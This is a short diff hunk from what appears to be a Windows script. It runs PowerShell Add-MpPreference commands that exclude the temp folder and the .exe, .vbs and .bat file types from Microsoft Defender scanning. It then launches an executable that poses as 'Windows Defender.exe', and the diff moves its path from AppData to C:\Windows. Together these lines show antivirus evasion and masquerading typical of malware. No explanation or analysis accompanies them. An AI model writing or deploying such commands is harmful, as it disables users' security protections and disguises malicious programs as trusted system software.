@@ -41,6 +41,6 @@ powershell.exe Add-MpPreference -ExclusionPath "%temp%"
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".vbs""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
-"%AppData%\Microsoft\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
+"C:\Windows\Windows Defender.exe" -P"rofile of Windows Defender [Microsoft Corporation]"
 
 
